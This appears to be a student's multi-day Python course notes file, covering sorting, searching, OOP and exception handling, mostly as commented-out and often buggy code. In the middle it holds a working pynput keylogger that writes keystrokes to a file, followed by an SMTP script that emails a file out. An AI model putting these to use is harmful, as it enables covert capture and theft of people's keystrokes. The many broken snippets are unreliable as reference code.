# DAY 1


# write a program to sort a list using recursion

# list_l = {3,6,7,8}
# sorted_list = {}
# temp = 0
# i = 0

# def sort():
#     if(list_l[i]<=list_l[i+1]):
#         temp==i
#         sorted_list.append(temp)
#         print(sorted_list)
#     sort()

# write a program to find the second largest element in O(n)

# def reverse_list(arr):
#     temp = 0
#     i = 0
#     while(len(arr)):
#         # swap
        
#         if(arr[i]>=arr[i+1]):
#             temp = arr[i]
#             arr[i] = arr[i+1]
#             arr[i+1] = temp

#         return arr

# arr = 

# print(reverse_list(arr))

# def merge_sort(my_list):

# 	# Base Case
#     if len(my_list) <= 1:
#         return my_list
   
#     list_1 = my_list[0:len(my_list) // 2]
#     list_2 = my_list[len(my_list) // 2:]
    
#    	# Induction Step
#     ans_1 = merge_sort(list_1)
#     ans_2 = merge_sort(list_2)
    
#     # Sorting and merging two sorted list
#     sort_list = sort_two_list(ans_1, ans_2)
#     return sort_list



# most of the keywords used in pytohn are as follows 
# def , if, etx , elif , return , break , continue , pass , or , while , in , not , and , or , 
# as , pass , void , true  , false , except , try , catch , class

# a variable is the name of the memory locastion where a value is stored

# naming convention of naming a variavle 
# there a re acertain set of rules to define a varible 
# some of the rules are as follows
'''1 cannot start with underscores
2 should not contain space in beteween the names
3 it cannot be started with number
4 the variabl name should be meaung ful  '''

# my name = 233
# print(my_name)
    # the coe above does not show the undefined error as the put[ut but the syntax error fas the putput]

# import keyword
# print(keyword.kwlist)

# this library and printing function prints out all the keywords that are used int he python language 


# def merge_sort(arr):
#     if len(arr) > 1:
#         mid = len(arr) // 2
#         left = arr[:mid]
#         right = arr[mid:]

#         merge_sort(left)
#         merge_sort(right)

#         i = j = k = 0

#         while i < len(left) and j < len(right):
#             if left[i] < right[j]:
#                 arr[k] = left[i]
#                 i += 1
#             else:
#                 arr[k] = right[j]
#                 j += 1
#             k += 1

#         while i < len(left):
#             arr[k] = left[i]
#             i += 1
#             k += 1

#         while j < len(right):
#             arr[k] = right[j]
#             j += 1
#             k += 1

#     return arr

# my_list = [4,4,7,3,8,67,12,55,89,24,56]
# sorted_list = merge_sort(my_list)
# print(sorted_list)


# def bubble_sort(arr, n):
#     if n == 1:
#         return arr

#     for i in range(n - 1):
#         if arr[i] > arr[i+1]:
#             arr[i], arr[i+1] = arr[i+1], arr[i]

#     return bubble_sort(arr, n - 1)


# my_list = [3, 6, 1, 8, 2, 10, 4]
# sorted_list = bubble_sort(my_list, len(my_list))
# print(sorted_list)



# class Node:
#     def __init__(self, data):
#         self.data = data
#         self.next = None

# class LinkedList:
#     def __init__(self):
#         self.head = None

#     def append(self, data):
#         new_node = Node(data)
#         if self.head is None:
#             self.head = new_node
#         else:
#             current = self.head
#             while current.next is not None:
#                 current = current.next
#             current.next = new_node

#     def print_list(self):
#         current = self.head
#         while current is not None:
#             print(current.data)
#             current = current.next



# my_list = LinkedList()
# my_list.append(1)
# my_list.append(2)
# my_list.append(3)
# my_list.print_list() # Output: 1 2 3



# linked lists

# list_1 = {1,1.0,'name'}
# list_1 = {2,4.7,'aadhaar'}

# print(list_1)


# TUPLES
# declaring a tuple 
# tuple_1 = ('new' , 'old' , 'test')
# print(tuple_1)
# ti[les are subscriptable
# tuples are immutable
# 






# # take input from the user
# num = int(input("Enter a number: "))

# # check if the least significant bit is 1 or 0
# if num & 1:
#     print("The least significant bit of the number is 1.")
# else:
#     print("The least significant bit of the number is 0.")




# Difference between for and while loop
# while loops is used where we do not know how many times the loop is going to execute
# but in the or loop we do know the range and iteration of the number of loops



# write a program to find the sum of n given numbers in python . the answer should be equal to 51
# n*(n-1)/2
# for i in range(int(input("enter a number"))):
#     sum+=i
# print(sum)



# n = int(input("Enter a number: "))
# sum_even = 0
# sum_odd = 0

# for i in range(1, n+1):
#     if i % 2 == 0:
#         sum_even += i
#     else:
#         sum_odd += i

# print("Sum of even numbers up to", n, "is:", sum_even)
# print("Sum of odd numbers up to", n, "is:", sum_odd)

# n = int(input("Enter a number: "))
# sum_even = 0
# sum_odd = 0

# for i in range(1, n+1):
#     if i % 2 == 0:
#         sum_even += i
#     else:
#         sum_odd += i

# print("Sum of even numbers up to", n, "is:", sum_even)
# print("Sum of odd numbers up to", n, "is:", sum_odd)


# temp = 10
# for i in range(temp):
#     print("* " *i)
#     i-=1




# # define the size of the pattern
# size = 10

# # loop for the upper triangle
# for i in range(1, size+1):
#     for j in range(1, i+1):
#         print("*", end=" ")
#     for j in range(i+1, size+1):
#         print(" ", end=" ")
#     for j in range(i, size):
#         print(" ", end=" ")
#     for j in range(1, i+1):
#         print("*", end=" ")
#     print()

# # loop for the lower triangle
# for i in range(size, 0, -1):
#     for j in range(1, i+1):
#         print("*", end=" ")
#     for j in range(i+1, size+1):
#         print(" ", end=" ")
#     for j in range(i, size):
#         print(" ", end=" ")
#     for j in range(1, i+1):
#         print("*", end=" ")
#     print()



# list = [2, 2, 0, 4, 0, 3, 3, 0, 1, 4, 7, 7, 0, 0]

# # remove all the 0's from the list
# list = [i for i in list if i != 0]

# # find the number of zeros in the original list
# n_zeros = len([i for i in list if i == 0])

# # add together any items with the same value
# for i in range(len(list) - 1):
#     if list[i] == list[i + 1]:
#         list[i] = list[i] + list[i + 1]
#         list[i + 1] = 0

# # move all the 0's to the end of the list
# for i in range(n_zeros):
#     list.append(0)

# print(sorted(list))




# DAY 2


# strings in pytohn are a sequence of characters
# it is an immutable data type
# means that that once you have created a string it cannot be changed
# strings are mainly used to store and manipulate the text data.

# the declaratio of string is given as below
# string_1 = "this is just a test string"
# string_2 = "this is another string statement."
# print(string_1+string_2)


# value = 101
# print(type(value))


# print(list(value))

# this is an example of multiline comments

# new  = '''ohoi matey his is your nightmare'''
# print(new)


# value = 'Ram'
# for i in range(len(value)):z
#     print("index"i,value[i])

# print(value[2])

'''

Question for pratice
email id by validating the following rules:

'''

# def verify(email):
#     valid=False
#     if email.split('@')[1] in ['gmail.com','yahoo.com']:
#         valid=True
#     count=0

#     for c in range (len(email)-1):
#         if email[c]==email[c+1]:
#             count+=1
#         if email[c]=='.':
#             email.replace('.','+')
#             valid = True
#     if valid and count<2:
#         print(email)
#         return True

# email = "raaju.ram@gmailcom"
# print(verify(email))

# lists are just dynamically sized arrays
# it is a clooection of object encloded in suare brackets separeated by a coma
# lis tis sequntia data which is used to store the collecrio of data
# the syntax to declare a list is as follws

# list_l = ['efef0','saefg']



# list_l = [1,2,3,4,4]

# def rotate(start,stop,list):
#     while(start<stop):
#         list(start),list(stop) = list(stop),list(start)
#         start+=1
#         stop-=1

# list1 = [1,2,3,4,4]
# key=2
# rotate(0,key-1,list1)
# rotate(key,len(list1)-1,list1)
# rotate(0,len(list1)-1,list1)
# print(list1)


# def stepcleancount(totaltiles , pos):
#     step count

# tuples is a sequence of values stored in enclosed parenthesis
# tuplea are created by using the sequence of values separated by comma with parenthesis
# creating a tuple ithou the parenthesis is known as the tuple packet.

# example of an empty tuple = new={}
# value = {}
# print(value)
# value = ('Raju' , 'ram')
# print(value)
# value = tuple('raju')
# print(value)

# accessing tuple through indexes
# we can also make this using the type casting method


'''Question 
you are given a text data where you would ahe to filter the daata on certain rules
1) Get the first name 
2)get the last four characters in null 'number
3)get any text data from address with starts with number ''

'''

# name = 'Aadhaar koul'
# for i in name :
#     if()

# consider that you have a list with values in nested from 
# where if the values are present in the second list make it zero and find the sum'''



# Dictionary is a collection if key , alue pairs used to store dat avalues like a map.
# unlike other data types which hold a single value the key value os provided in a dictionary to make it more optimized .
# Dictonary internally uses a adata str know as a hash map;
# table which stores the values in keys.

# hash map uses the hash functio in order to use the hash function
# 3:300
# hash function is something like equal to hash of 3 the internally the hash function is considered as the three or one 
# value = 
# {
    
# }

# i =12
# new = 1
# while(new <= 20):
#     print("*"*i)
#     # while(new <= 20):
#     #     print("*"*i)


# dict = {
#     string = "ioifnnbifnbiefnbe"
#     for i in mydict.update(list)
# }

'''

the major advantage of using a set is it is highl optimized method checking if an element is present or not 
the elements are /....the big oh of N
4,4,6,7,9
big oh of 1 is the time complextity for calc the time comp of a program


'''

'''
a set is creatd using a build in set method with an iterable object or a sequence by placcig the sequence inside the curly brace separated by comma'''

# a set cannot have mutable elements like a list a dictionary as it is mutable .
# 
# set 1 = set()
# empty set 
# set1 = set("Hello world")

# # it will not be stored in the same order 

# print(set1)

# print(set1)
# sat1 = 



# DAY 3 work

# Function
# a functio is a well
# it is a well defined set of rules either set by the user or in built that 
# perform out a specific function at a certain point of execution of the code
# A function can have parameters or a function can also not have any parameters
# a function can be defined by specifying the keyworf def followed by the name of the 
# function ad the open and close parenthesis

# def myfun():
#     print("This function is called")
# myfun()

# def myadd(num1 , num2 = 10):
#     return num1


# there are two special symbols 
# non keyword argumets
# 2 star and keyword arguments
# in order to pass the non keyword args we 

# written statement 
# difference between the pass by reference and pas by value

# in py every variable name is a reference when we pass a variable to a finction a new reference for the object is created
# paremeter passing in py is same as reference passing 

# example of the above statement is 
# def swap(x,y):
#     tmep = x
#     x=y
#     y=temp
# x=2
# y=3
# swap(4,7)

# Anonymous function
# anonymous is a nameless funtion and only returns only one param
# anon function means that a function is without any name 
# we use a def keyword in order to define a normal and we use a lambda keyword to defina a lambda function4

# SYNTAX TO DEFINE A ANONYMOUS FUNCTION
# var name followed by the assignment op lambda keyword and followed by the number of param 

# in order to execute this funtion 
# we use an anon function in order to perform out a very small function 

'''
FIND THE MAX OF TWO NUMBER USING LAMBDA FUNCTION
'''
# # answer
# add = lambda a,b,c : a if a>b else b>c if b>c else c
# print(add(8,10,11))
# +

# def merge_sort(lst):
#     if len(lst) <= 1:
#         return lst

#     # Divide the list into two halves
#     middle = len(lst) // 2
#     left_half = lst[:middle]
#     right_half = lst[middle:]

#     # Recursively sort the two halves
#     left_half = merge_sort(left_half)
#     right_half = merge_sort(right_half)

#     # Merge the two sorted halves
#     result = []
#     while len(left_half) > 0 and len(right_half) > 0:
#         if left_half[0] < right_half[0]:
#             result.append(left_half[0])
#             left_half = left_half[1:]
#         else:
#             result.append(right_half[0])
#             right_half = right_half[1:]
#     result += left_half
#     result += right_half
#     return result



# my_list = [4, 2, 7, 1, 3, 4, 6]
# sorted_list = merge_sort(my_list)
# print(sorted_list)  # Output: [1, 2, 3, 4, 4, 6, 7]




# a recursion is the process of callin a function within the functio itself



# new = input()
# neww = True

# print("Enter you name")

# while(neww == True):
#     print("Fuck You " + str(new))

#  PROGRAM TO PRINT OUT THE PASCAL TRIANGLE
# def print_pascals_triangle(n):
#     """
#     This function takes an integer n as input and prints the first n rows of Pascal's Triangle.
#     """
#     triangle = [[1]]
#     for i in range(1, n):
#         row = [1]
#         for j in range(1, i):
#             next_elem = triangle[i-1][j-1] + triangle[i-1][j]
#             row.append(next_elem)
#         row.append(1)
#         triangle.append(row)
#     for row in triangle:
#         print(' '.join([str(elem) for elem in row]).center(2*n))
        
# print_pascals_triangle(4)

# # PASCAL's TRIANGLE USING RECURSION

# def pascals_triangle(row, col):
  
#     if col == 0 or col == row:
#         return 1
#     else:
#         return pascals_triangle(row-1, col-1) + pascals_triangle(row-1, col)

# def print_pascals_triangle(n):
  
#     for i in range(n):
#         for j in range(i+1):
#             elem = pascals_triangle(i, j)
#             print(elem, end=' ')
#         print()

# print_pascals_triangle(7)


# # SIR's APPROACH
# def pascal(n):
#     if n==1:
#         return 1
#     else:
#         line = [1]
#         previousLine = pascal(n-1)
#         for i in renage(len(previousLine)-1):
#             line.apped(previousLine[i]+previousLine[i+1])
#         line+=[1]
#         print(line)
#     return line


# TOWER OF HANOI

# def tower_of_hanoi(n, src, trget, auxiliary):
#     if n == 1:
#         print("Move disk 1 from source", src, "to target", trget)
#         return trget
#     tower_of_hanoi(n-1, src, auxiliary, trget)
#     print("Move disk", n, "from source", src, "to target", trget)
#     tower_of_hanoi(n-1, auxiliary, trget, src)

# n = 3
# tower_of_hanoi(n, 'A', 'C', 'B')  






# def sum_of_digits(num):
#     if num < 10:
#         return num
#     else:
#         return num % 10 + sum_of_digits(num // 10)
# num = int(input("Enter a number: "))
# sum = sum_of_digits(num)
# print("The sum of the digits in the number is:", sum)


# def find_max(numbers):
   
#     max_num = numbers[0]  
    
#     for num in numbers:
#         if num > max_num:
#             max_num = num
    
#     return max_num

# my_numbers = [4, 8, 1, 9, 3, 4, 2]
# print(find_max(my_numbers)) 


# OBJECT ORIENTED PROGRAMMING
# OBJECT ORIENTED PROGRAMMING IS A CONCEPT OWHICH DEAL WITH THE RELA EORLD ENTITITES
# it use sthe classes and objects 
# object oriented rogrammin has 4 mai illars , inhertace , poly , encap , etc

# What are classes ?
# classes are collectio of objects ad are defined using ht class keyword\
# objects are a blueprint or a instance of a class 
# a separate memory is allocated when the object of a class is created 
# . ad i tca only besaccessd by the pbject name 
# object names should be unique because it acts like an idetifier

# class student:
#     name = "krish"
#     rollnumber = 1331

# if __name__=='__main__':
      
# class Square:
#     def __init__(self, num):
#         self.num = num
    
#     def calculate(self):
#         return self.num ** 2


# s = Square(4)
# result = s.calculate()
# print(result)


'''
you are in exploration of a new language where you find a tribe and you are in 
exploration of a new language where you find a tribe and your task is to find
 what they aer trying to communicate they use a number language where 101means 
 A ad 102 refers to B and so on please de cipher the lang and communication
  with tribe input is given in the format of a string return the words 
  framing a sentence i, /p = ["101 102 108 109, 111 123 119 101 , 109 113 117 112"]
your task is to find what they aer trying to communicate they use a 
number language where 101means A ad 102 refers to B and so on please de 
cipher the lang and communication with tribe input is given in the format 
of a string return the words framing a sentence i, /p = ["101 102 108 109, 111 123 119 101 , 109 113 117 112"]'''

# DAY 4
# EXCEPTION HANDLING 

'''
Error in pytohn ca be of two types
Exception and syntax error
errors are the problems in a program due to which the program will stop
exception is raised when the program is syntactically correct but the program flow stops durig the execution

Exception handling is used to hnadle the runtime errors to handle these errors we use the following blocks , try 
and except statements.
The two key words that we use in the exception handling are : try , catch and else , except

'''
# def add(*args):
#     x,y=args
#     if y == 0:
#         b = x/y
#         print(b)
#         print(b+x+y)
#     else:
#         print(b+x+y)

# try:
#     add(10,4)  # this cod eis not executed but the control flow will keep on cotinuing itselflslsmm
# except ZeroDivisionError:
#     print("Zero division error was handled")
# except NameError():
#     print("a variable is not declared")
# add(10,0)
# add(10,4)


# Finally keyword is always executed after teh try and except blocks 
# the finally block always executed after the normal terminaion of try block

# finally:
#     print("the finally block is executed ")

# the raise keyword is used in the program during hte exception handling to raise
#  a specific exception thet indicateds the exception

'''Write a program to access an element in a list with the index with
 length 10 and  take input from th euser n and if the user tries to access
  index out of length handle the error using exception handling'''


# my_list = [1, 2, 3, 4, 4, 6, 7, 8, 9, 10]

# try:
#     n = int(input("Enter an index between 0 and 9: "))
#     element = my_list[n]
#     print("The element at index {} is {}".format(n, element))
# except IndexError:
#     print("Error: Index out of range. Please enter an index between 0 and 9.")
# except ValueError:
#     print("Error: Please enter a valid integer.")

'''
Samragyi is a businesswomen and is planning to invest on N companies
 and she is planning to invest from the money values in Kunas(k) where she has to invest in a 
 unique order where all of her Kunas are invested in all companies and making sure they 
 are not equally distributed each company should get a different sum of investment .

 the sample input k = 100 N = 4
 output: [1,2,3,94]


'''
# Sirs approach
# def samragyisinvestment(n,k):
#     investment=[]
#     sum_kuas = 0
#     for i in range(k-1):
#         investment.append(i+1)
#         sum_kuas +=i+1
#     investment.append(n,sum_kuas)
#     return investment
# print(samragyisinvestment(100,4))

# the sirs approach is mush more fesiable and more sustainable


# ####################################

# import math
# import random

# def unique_distributions(total_kunas, n_companies):
   
#     distributions = []
#     for k in range(1, n_companies+1):
#         num_ways = math.comb(n_companies, k)
#         min_kunas = total_kunas // k
#         max_kunas = total_kunas // k + 1
#         for c in range(num_ways):
#             amounts = [min_kunas] * (n_companies - k) + [max_kunas] * k
#             random.shuffle(amounts)
#             if len(set(amounts)) == n_companies:
#                 distributions.append(amounts)
#     return distributions


# total_kunas = 100
# n_companies = 4
# distributions = unique_distributions(total_kunas, n_companies)
# print(distributions)


# INHERITACNE
'''
inheritance is process of acquiring the content of one class to another class
it is one of the core concepts of the object orienred programming it allows you ti create a hirerchy of 
classes that a set of properties and methods by deriving a class form class to anther

inheritace is the capability of copying the properties from one calss to anther 
it represents the real workd relationships.
it provides the reusability of the code
it has a simple and a understandable modal and structured
it is easy to debug 
'''

# class new:
    # here goes the body of the class
    # also the member function of the class

# class a:
#     new = 1

# class b(a):
#     def result():
#         newer = a.new * 2
#         print(newer)    

# obj = b()

# b.result()

# # this was an example of the single level inheritance

# the different types of the inheritance is as folow 

'''1 single level inheritace
-> in this type of inheritance we acquire the properties of ine clas to anther child class
or we can also call it as the parent class or the chil class and the base class '''
# class base:
#     def __init__(self):
#         print("Base Class")

# class derived(base):
#     def __init__(self):
#         print("Derived class")

# class main:
#     obj = derived()



'''2 multilivel -> i this type of inheritance the base class derives
 the data member from a class that is derived from an existing calss 
 there are multiple levewl of inheritance n the the multilevel inheritance'''

# class base:
#     def __init__(self,brand):
#         self.brand = brand

# class Derived:
#     def __init__(self,brand,color,model) -> None:
#         base.__init__(self.brand)
#         self.color=color
#         self.brand=brand
#         self.model=model
#         print(self.color , self.model)

# class subDerived(Derived):
#     def __init__(self, brand, color, model , price)
#     :
#         super().__init__(brand, color, model)



'''3 hirerchial inheritance - 
'''

# class Student:
#     def __init__(self, name, age, class_name, roll_no):
#         self.name = name
#         self.age = age
#         self.class_name = class_name
#         self.roll_no = roll_no

# class Marks(Student):
#     def __init__(self, name, age, class_name, roll_no, marks_dict):
#         super().__init__(name, age, class_name, roll_no)
#         self.marks_dict = marks_dict

# class ReportCard(Marks):
#     def __init__(self, name, age, class_name, roll_no, marks_dict):
#         super().__init__(name, age, class_name, roll_no, marks_dict)

#     def calculate_percentage(self):
#         total_marks = 0
#         for subject, marks in self.marks_dict.items():
#             total_marks += marks
#         percentage = (total_marks / (len(self.marks_dict) * 100)) * 100
#         return percentage

#     def print_report(self):
#         print("Name:", self.name)
#         print("Age:", self.age)
#         print("Class:", self.class_name)
#         print("Roll No.:", self.roll_no)
#         print("Marks:", self.marks_dict)
#         print("Percentage:", self.calculate_percentage())

# marks_dict = {'English': 75, 'Maths': 80, 'Science': 85, 'Social Science': 70, 'Computer Science': 90}
# report_card = ReportCard('John', 15, '10th', '101', marks_dict)
# report_card.print_report()

        
'''
KEYLOGGER SCRIPT

from pynput import keyboard

# Define a function to write keystrokes to a text file
def on_press(key):
    with open('keystrokes.txt', 'a') as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(str(key))

# Set up a listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()'''

# the below code is used to send a file or a text to a particular mail using the smtp server in py

'''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders

# Set up email parameters
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "your_email@gmail.com"
sender_password = "your_password"
recipient_email = "recipient_email@gmail.com"

# Set up the message container
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = recipient_email
msg['Subject'] = "Email with attachment"

# Add the file or image attachment
filename = "file.txt" # replace with your file name
with open(filename, 'rb') as attachment:
    # If the attachment is an image, use MIMEImage
    if filename.endswith('.jpg') or filename.endswith('.png'):
        image = MIMEImage(attachment.read())
        msg.attach(image)
    # Otherwise, use MIMEBase
    else:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        f'attachment; filename={filename}')
        msg.attach(part)

# Connect to the SMTP server and send the email
with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.starttls()
    server.login(sender_email, sender_password)
    server.sendmail(sender_email, recipient_email, msg.as_string())
'''



# Encaptulation
'''
Encaptulation is one of the fundamental concept of object orie ted programming
it describes the wrapping of the data with code we can prevent the acces of the variables 
and the methods directly by emcaptulating it and the private member functions and private 
members of a class cannot be accessed outside the class nor by creationg the object 
and accessing it through the instances . The private meber can only be assessed through the 
member functions of the same class.
'''



# SEARCHING ALGORITHMS 

#1 LINEAR SEARCH 
'''

'''
# Example
# list = [5,4,3,2,11,7,9,12]

# class LinearSearch:
#     def search(self , list , n):
#         for i in range(len(list)):
#             if list[i]==n:
#                 return i
#         return -1

# search = LinearSearch()
# print(search.search(list,7))


# the time complextiy of the above algo is = O(x)
# the space complexity of the above algo = O(1)

# BINARY SEARCH
# in the binary searh the list must be sorted


# from re import search


# lis = [2,3,7,9,10,12,15]

# def search(lis , l , h , n):
#     if h>=l:
#         mid = l + (h-l)//2
#         if lis[mid]==n:
#             return mid
#         elif lis[mid] > n:
#             return search(lis , l , mid-1 , n)
#         else:
#             return search(lis,mid+1,h,n)
#     else:
#         return -1
# n = 12
# print(search(lis,0,len(lis)-1,n))
# the time complexity of te a;go is O(log(nd))

# INTERPOLATION SEARCH
# it is improved over the binary search where the value sof hte sprted a rrays are unoformly distributed
# interpolation search costructs new data pts wothion the range of discretw set of known data pts 
# binary searhc goes to the n=middle ele on the other hand the interpolation oes to the diff locations 
# according tot eh value of the key

# def  InterpolationSearch(lis,l,h,n):
#     if l<=h and n >= lis[l] and n <= lis[h]:
#         pos = (l+h // (lis[h] - lis[l]) * (n-lis[l]))

#         if lis[pos] == n:
#             return pos
#         if lis[pos]<n:
#             return InterpolationSearch(lis,pos+1,h,n)
#         if lis[pos]>n:
#             return InterpolationSearch(lis,l,pos-1,n)
        
#         else:
#             return -1
        
#     lis = [2,4,,5,7,8,9,10,12,17,19,20,22,28,29]
# print(InterpolationSearch(lis , 0, len(lis)-1 , 20))






# JUMP SEARCH
'''
similiar to the binary search the block seach os an algo only fot he ordered or sorted list. the major idea behinghtis algo 
is tp make the less comparisons by skipping a definite amount of elements between the ones getting compared leading to \
less time reured fo rhe searchin process space complexity is O(1) and the time compleaxtiy is O(n)

'''

# EXAMPLE
# import math

# lis = [1,2,3,4,5,6,7,8,9,10]
# n=20
# gap = math.sqrt(len(list))
# left = 0
# while(lis[int(min(gap , len(lis)-1))]<n):
#     gap = gap+math.sqrt(len(lis))
#     print(int(gap),left)
#     if(left >= len(lis)):
#         break
# while (lis[int(left)]<n):
#     left = left +1
#     if(left==min(gap,len(list))):
#         break
# if lis[int(left)==n]:
#     print(int(left))

# the most efficient searchong algo is the Binary Searhc algo
# the time and space complexity of teh algos acan be found out by the following methpd

# consider 
# lis = [10,12,8,9,0,19,81,7,21,11,13]

# x = 12
# def fun(x):
#     for i in range(len(lis)):
#         if(lis[i] == x):
#             print(i)
        
# fun(x)



# # using recursion 
# def search(lis , l , h , key):
#     if l<=h:
#         mid = (l+h)//2
#     if lis[mid]==key:
#         return i
#     elif lis[mid]>key:
#         return search(lis , mid + 1 , h , key)
#     else:
#         return search()

#     return -1

# lis = sorted([10,12,8,9,0,19,81,7,21,11,13])
# key = 81
# print(search(lis , 0 , key))

'''
One day , Mirko came across a funny looking machine! It consisted 
of a very very large screen and a single button. When he found the machine ,
 the screen displayed only the letter A . After he pressed the button , the 
 letter chaged to B. The next few times he pressed the button , the word transformed 
 from B to BA, then to BAB , then to BABBBA. when he saw this , Mirko realised 
 alters the word in a way that all the letters B get transfomed to BA and all 
 the letters A get transformed to B. Asumed by the machine , Mirko asked you
   a very difficult uestion! After K times of pressing the button , how much 
   letters A and how much letters B will be displayed on the screen
'''

# def sequence_and_counts(k):
#     seq = 'A'
#     a_count = 1
#     b_count = 0
    
#     for i in range(k):
#         new_seq = seq.replace('A', 'B').replace('B', 'BA')
#         new_a_count = b_count
#         new_b_count = a_count + b_count
#         seq, a_count, b_count = new_seq, new_a_count, new_b_count
    
#     return seq, a_count, b_count
# seq, a_count, b_count = sequence_and_counts(3)
# print(f'Sequence: {seq}')
# print(f'Number of A\'s: {a_count}')
# print(f'Number of B\'s: {b_count}')


# number_of_cookies_per_bag = 03



# BUBBLE SORT SORTING ALGO
'''
inthe bubble sort algo  an element is compared with its adjacent element and id the element is found to be
less than teh former element it is swapped with the first one
''' 

# for ex

# list = [5,3,7,1,2,45,23]

# def bubblesort(list):
#     for i in range(len(list)):
#         for j in range(len(list)-1):
#             if list[j] > list[j+1]:
#                 list[j],list[j+1]=list[j+1],list[j]
# bubblesort(list)
# print(list)



# sample input = 3
                #3 1 5list = [5,3,7,1,2,45,23]

# def bubblesort(list):
#     for i in range(len(list)):
#         for j in range(len(list)-1):
#             if list[j] > list[j+1]:
#                 list[j],list[j+1]=list[j+1],list[j]
# bubblesort(list)
# print(list)

# out put = 3



# DAY 6

# Mergesort
'''
basically in this way we use the concept of divide and conqur

'''

# def mergesort():
#     if len(list) > 1:
#         mid = len(list)//2

#         # now we declare the left side of themergesorted
#         # we will sore the left side values to the left list by using the concept of slicing

#         L = list[:mid] # all teh values to the left of the mid in the list a re stored int he value
#         R = list[mid:] # all the values to the right of the list are stoed in the i the R value

#         # divide and conquer is only possible through recursion

#         mergesort(L)
#         mergesort(R)

#         i = j = k = 0

#         # Copy the left values and save them tot eh temp variable 

#         while i < len(L) and j < len(R):
#             if L[i] <= R[j]:
#                 L[k]=L[i]
#                 i+=1
#             else:
#                 L[k] = L[j]
#                 j+=1

#         while i < len(L):
#             list[k] = L[i]


#  LINKDE list









